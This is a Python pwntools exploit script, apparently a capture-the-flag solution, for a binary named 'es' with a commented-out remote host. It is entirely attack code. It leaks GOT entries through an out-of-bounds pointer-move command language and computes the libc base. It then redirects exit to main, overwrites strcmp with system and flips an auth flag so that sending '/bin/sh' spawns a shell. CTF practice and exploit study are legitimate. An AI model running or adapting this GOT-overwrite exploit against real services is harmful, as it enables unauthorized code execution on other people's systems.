from pwn import *

# r = process('./es')

host = "185.66.87.233"
port = 5001
# r = remote(host, port)
r = process('./es')

gdb.attach(r, ''' 
b*0x80495af
c
c
b*0x8049574
''') 

r.recvuntil('Login: ')
payload = ''
payload += 'admin'
r.sendline(payload)

r.recvuntil('Password: ') 
payload = ''
payload += 'password'
r.sendline(payload)

print "[*]------------round1----------------"
# leak strcmp & putchar
# overwrite got.exit -> sym.main for ret2vuln
# (default ptr address: 0x804c0a0)

print r.recvuntil(' here: ') 
payload = ''

# leak got.strcmp (for overwrite)
payload += 'd' * 148 
payload += 'p'
payload += 'up' * 3 

# leak got.putchar (for calc base)
payload += 'u' * 45 
payload += 'p'
payload += 'up' * 3

# overwrite got.exit -> sym.main
payload += 'd' * 23 
payload += 's' * 132
payload += 'u'
payload += 'a' * 2

# print len(payload)
r.sendline(payload)

print "[*]------------round2----------------"
# calc base address
# overwrite got.strcmp(@0x804c00c) -> libc.system

leak_strcmp = r.recv(4)
leak_strcmp = u32(leak_strcmp)

leak = r.recv(4)
leak = u32(leak)
base = leak - 0x69130

# print "leak_strcmp:", hex(leak_strcmp)
# print "leak_putchar:", hex(leak)
# print "base:", hex(base)

system = base + 0x3cd10
binsh = base + 0x17b8cf

# print "system: ", hex(system)
# print "binsh: ", hex(binsh) 
# print "before: ", hex(leak_strcmp)
# print "after : ", hex(system)


# overwrite got.strcmp -> libc.system
print r.recvuntil(' here: ') 
payload = ''
payload += 'd' * (148 + 1)  # move to got.strcmp again

for i in range(0, 4):
    before = (leak_strcmp >> (i*8)) & 0xff 
    after  = (system >> (i*8)) & 0xff 
    diff = after - before
    # print "diff: ", hex(diff)

    payload += 'u'
    if diff >= 0:
        payload += 'a' * diff
    else:
        payload += 's' * (diff * (-1))

r.sendline(payload)
print "[*]------------round3----------------" 
# auth flag(0x804c064) 1 -> 0 for using got.strcmp with scanf

print r.recvuntil(' here: ') 
payload = ''
payload += 'd' * 60
payload += 's'
r.sendline(payload)

print "[*]------------round4----------------"
# input "/bin/sh" to got.strcmp(now libc.system)

print r.recvuntil('Login: ') 
payload = ''
payload += '/bin/sh'
r.sendline(payload)
print r.recvuntil('Password: ') 
payload = ''
r.sendline(payload)

r.interactive()
r.close() 
